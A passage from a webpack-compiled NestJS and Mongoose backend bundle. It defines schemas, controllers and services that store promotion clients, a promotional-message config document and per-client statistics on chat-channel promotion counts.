    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], PromoteClient.prototype, "channels", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], PromoteClient.prototype, "clientId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: 'active' }),
    __metadata("design:type", String)
], PromoteClient.prototype, "status", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: 'Account is functioning properly' }),
    __metadata("design:type", String)
], PromoteClient.prototype, "message", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "lastUsed", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "privacyUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "profilePicsUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "nameBioUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "profilePicsDeletedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "usernameUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "createdAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "updatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "lastChecked", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "lastUpdateAttempt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Number, default: 0 }),
    __metadata("design:type", Number)
], PromoteClient.prototype, "failedUpdateAttempts", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], PromoteClient.prototype, "lastUpdateFailure", void 0);
exports.PromoteClient = PromoteClient = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'promoteClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], PromoteClient);
exports.PromoteClientSchema = mongoose_1.SchemaFactory.createForClass(PromoteClient);
exports.PromoteClientSchema.index({ clientId: 1 });


/***/ }),

/***/ "./src/components/promote-msgs/index.ts":
/*!**********************************************!*\
  !*** ./src/components/promote-msgs/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./promote-msgs.controller */ "./src/components/promote-msgs/promote-msgs.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-msgs.schema */ "./src/components/promote-msgs/promote-msgs.schema.ts"), exports);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.controller.ts":
/*!****************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.controller.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
let PromoteMsgsController = class PromoteMsgsController {
    constructor(promoteMsgsService) {
        this.promoteMsgsService = promoteMsgsService;
    }
    async findOne() {
        return this.promoteMsgsService.findOne();
    }
    async update(updateClientDto) {
        return this.promoteMsgsService.update(updateClientDto);
    }
};
exports.PromoteMsgsController = PromoteMsgsController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote-msgs data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote-msgs' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "update", null);
exports.PromoteMsgsController = PromoteMsgsController = __decorate([
    (0, swagger_1.ApiTags)('Promote-msgs'),
    (0, common_1.Controller)('promote-msgs'),
    __metadata("design:paramtypes", [promote_msgs_service_1.PromoteMsgsService])
], PromoteMsgsController);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.module.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.module.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const promote_msgs_controller_1 = __webpack_require__(/*! ./promote-msgs.controller */ "./src/components/promote-msgs/promote-msgs.controller.ts");
const promote_msgs_schema_1 = __webpack_require__(/*! ./promote-msgs.schema */ "./src/components/promote-msgs/promote-msgs.schema.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let PromoteMsgModule = class PromoteMsgModule {
};
exports.PromoteMsgModule = PromoteMsgModule;
exports.PromoteMsgModule = PromoteMsgModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            PromoteMsgModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: promote_msgs_schema_1.PromoteMsgSchema }]),
        ],
        providers: [promote_msgs_service_1.PromoteMsgsService],
        controllers: [promote_msgs_controller_1.PromoteMsgsController],
        exports: [promote_msgs_service_1.PromoteMsgsService],
    })
], PromoteMsgModule);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.schema.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.schema.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgSchema = exports.PromoteMsg = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let PromoteMsg = class PromoteMsg {
};
exports.PromoteMsg = PromoteMsg;
exports.PromoteMsg = PromoteMsg = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], PromoteMsg);
exports.PromoteMsgSchema = mongoose_1.SchemaFactory.createForClass(PromoteMsg);
exports.PromoteMsgSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.service.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.service.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let PromoteMsgsService = class PromoteMsgsService {
    constructor(promotemsgModel) {
        this.promotemsgModel = promotemsgModel;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.promotemsgModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return updatedUser;
    }
};
exports.PromoteMsgsService = PromoteMsgsService;
exports.PromoteMsgsService = PromoteMsgsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('promotemsgModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], PromoteMsgsService);


/***/ }),

/***/ "./src/components/promote-stats/dto/create-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/create-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreatePromoteStatDto {
}
exports.CreatePromoteStatDto = CreatePromoteStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    __metadata("design:type", String)
], CreatePromoteStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    __metadata("design:type", Map)
], CreatePromoteStatDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719860106247.0, description: 'Last Updated TimeStamp' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    __metadata("design:type", Boolean)
], CreatePromoteStatDto.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    __metadata("design:type", Array)
], CreatePromoteStatDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-stats/dto/index.ts":
/*!***************************************************!*\
  !*** ./src/components/promote-stats/dto/index.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-promote-stat.dto */ "./src/components/promote-stats/dto/update-promote-stat.dto.ts"), exports);


/***/ }),

/***/ "./src/components/promote-stats/dto/update-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/update-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
class UpdatePromoteStatDto extends (0, swagger_1.PartialType)(create_promote_stat_dto_1.CreatePromoteStatDto) {
}
exports.UpdatePromoteStatDto = UpdatePromoteStatDto;


/***/ }),

/***/ "./src/components/promote-stats/index.ts":
/*!***********************************************!*\
  !*** ./src/components/promote-stats/index.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./promote-stat.controller */ "./src/components/promote-stats/promote-stat.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-stat.module */ "./src/components/promote-stats/promote-stat.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/promote-stats/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/promote-stats/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.controller.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.controller.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./dto/create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
const update_promote_stat_dto_1 = __webpack_require__(/*! ./dto/update-promote-stat.dto */ "./src/components/promote-stats/dto/update-promote-stat.dto.ts");
let PromoteStatController = class PromoteStatController {
    constructor(promoteStatService) {
        this.promoteStatService = promoteStatService;
    }
    async create(createPromoteStatDto) {
        return this.promoteStatService.create(createPromoteStatDto);
    }
    async findByClient(client) {
        return this.promoteStatService.findByClient(client);
    }
    async update(client, updatePromoteStatDto) {
        return this.promoteStatService.update(client, updatePromoteStatDto);
    }
    async deleteOne(client) {
        return this.promoteStatService.deleteOne(client);
    }
    async deleteAll() {
        return this.promoteStatService.deleteAll();
    }
};
exports.PromoteStatController = PromoteStatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_stat_dto_1.CreatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "findByClient", null);
__decorate([
    (0, common_1.Put)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_stat_dto_1.UpdatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteAll", null);
exports.PromoteStatController = PromoteStatController = __decorate([
    (0, swagger_1.ApiTags)('promote-stats'),
    (0, common_1.Controller)('promote-stats'),
    __metadata("design:paramtypes", [promote_stat_service_1.PromoteStatService])
], PromoteStatController);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.module.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.module.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatModule = void 0;
const init_module_1 = __webpack_require__(/*! ./../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const promote_stat_controller_1 = __webpack_require__(/*! ./promote-stat.controller */ "./src/components/promote-stats/promote-stat.controller.ts");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
let PromoteStatModule = class PromoteStatModule {
};
exports.PromoteStatModule = PromoteStatModule;
exports.PromoteStatModule = PromoteStatModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: promote_stat_schema_1.PromoteStat.name, collection: "promoteStats", schema: promote_stat_schema_1.PromoteStatSchema }]),
            client_module_1.ClientModule
        ],
        controllers: [promote_stat_controller_1.PromoteStatController],
        providers: [promote_stat_service_1.PromoteStatService],
        exports: [promote_stat_service_1.PromoteStatService]
    })
], PromoteStatModule);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.service.ts":
/*!**************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.service.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
let PromoteStatService = class PromoteStatService {
    constructor(promoteStatModel, clientService) {
        this.promoteStatModel = promoteStatModel;
        this.clientService = clientService;
    }
    async create(createPromoteStatDto) {
        const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);
        return createdPromoteStat.save();
    }
    async findAll() {
        const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();
        return promoteStat;
    }
    async findByClient(client) {
        const promoteStat = await this.promoteStatModel.findOne({ client }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async update(client, updatePromoteStatDto) {
        const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async deleteOne(client) {
        const result = await this.promoteStatModel.deleteOne({ client }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
    }
    async deleteAll() {
        await this.promoteStatModel.deleteMany({}).exec();
    }
    async reinitPromoteStats() {
        const users = await this.findAll();
        for (const user of users) {
            await this.promoteStatModel.updateOne({ client: user.client }, {
                $set: {
                    totalCount: 0,
                    uniqueChannels: 0,
                    releaseDay: Date.now(),
                    lastUpdatedTimeStamp: Date.now(),
                    data: {}
                }
            });
        }
    }
};
exports.PromoteStatService = PromoteStatService;
exports.PromoteStatService = PromoteStatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(promote_stat_schema_1.PromoteStat.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        client_service_1.ClientService])
], PromoteStatService);


/***/ }),

/***/ "./src/components/promote-stats/schemas/index.ts":
/*!*******************************************************!*\
  !*** ./src/components/promote-stats/schemas/index.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts"), exports);


/***/ }),

/***/ "./src/components/promote-stats/schemas/promote-stat.schema.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/schemas/promote-stat.schema.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
